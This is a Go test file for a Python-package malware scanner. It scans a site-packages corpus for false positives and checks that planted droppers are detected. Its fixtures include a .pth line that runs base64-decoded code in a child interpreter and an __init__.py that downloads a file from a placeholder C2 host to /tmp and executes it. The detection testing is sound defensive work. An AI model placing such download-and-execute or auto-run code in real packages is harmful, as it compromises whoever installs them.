package pysource

import (
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// TestCorpusFalsePositives scans every top-level entry under
// CHAINSAW_PYSOURCE_CORPUS (an unpacked site-packages: each directory is one
// package, each .pth/.py file stands alone). It FAILS on any hit from the
// v0.22.106 rules (F7 .pth lines, F14 download_exec and child-interpreter
// decode) and on any Dispositive result, checked file by file so an older kind earlier in the same package
// cannot mask one, and only LOGS the older kinds, which are known to fire on
// benign packages and are unscored for that reason (core/risk). A planted
// dropper is scanned in the same run so a green result cannot come from rules
// that fire on nothing. Skips when the variable is unset.
func TestCorpusFalsePositives(t *testing.T) {
	dir := os.Getenv("CHAINSAW_PYSOURCE_CORPUS")
	if dir == "" {
		t.Skip("CHAINSAW_PYSOURCE_CORPUS not set")
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) == 0 {
		t.Fatalf("nothing under %s: the eval would pass having scanned nothing", dir)
	}
	var older, newer []string
	nfiles := 0
	for _, e := range entries {
		files := readTree(filepath.Join(dir, e.Name()))
		if r := Scan(files); r.Detected {
			older = append(older, e.Name()+" "+r.Kind+" "+r.Detail)
		}
		for name, b := range files {
			if hit := newRuleHit(name, b); hit != "" {
				newer = append(newer, e.Name()+" "+hit+" "+name)
			}
			nfiles++
		}
	}
	sort.Strings(older)
	sort.Strings(newer)
	t.Logf("scanned %d entries (%d files): %d flagged by any rule, %d by the v0.22.106 rules", len(entries), nfiles, len(older), len(newer))
	for _, h := range older {
		t.Logf("any rule: %s", h)
	}
	for _, h := range newer {
		t.Errorf("flagged by a v0.22.106 rule: %s", h)
	}
	planted := map[string]string{
		"evil.pth":      "import subprocess,sys;subprocess.Popen([sys.executable,'-c',__import__('base64').b64decode('eA==').decode()])\n",
		"d/__init__.py": "import subprocess, urllib.request\nurllib.request.urlretrieve('https://c2.example.invalid/x', '/tmp/x.pyz')\nsubprocess.Popen(['python3', '/tmp/x.pyz'])\n",
	}
	for name, body := range planted {
		if newRuleHit(name, []byte(body)) == "" {
			t.Fatalf("planted %s not detected: the eval cannot fail", name)
		}
	}
}

// newRuleHit reports which v0.22.106 rule, if any, fires on one file, or the
// kind of any Dispositive result (the install guard refuses on those, so
// top_level_shell counts here too).
func newRuleHit(name string, b []byte) string {
	lower := strings.ToLower(name)
	if !strings.HasSuffix(lower, ".pth") && !strings.HasSuffix(lower, ".py") {
		return ""
	}
	if r := Scan(map[string][]byte{name: b}); r.Dispositive {
		return "dispositive:" + r.Kind
	}
	if strings.HasSuffix(lower, ".pth") {
		if r := Scan(map[string][]byte{name: b}); r.Detected {
			return "pth:" + r.Kind
		}
		return ""
	}
	body := string(b)
	if childExecRE.MatchString(body) {
		return "child_exec"
	}
	if _, _, _, _, dl := topLevelSignals(body); dl {
		return "download_exec"
	}
	return ""
}

// readTree reads every regular file under root (root itself if it is a file),
// keyed by its path relative to root's parent.
func readTree(root string) map[string][]byte {
	out := map[string][]byte{}
	base := filepath.Dir(root)
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if info, err := d.Info(); err != nil || !info.Mode().IsRegular() || info.Size() > maxFileSize {
			return nil
		}
		if b, err := os.ReadFile(p); err == nil {
			rel, _ := filepath.Rel(base, p)
			out[filepath.ToSlash(rel)] = b
		}
		return nil
	})
	return out
}
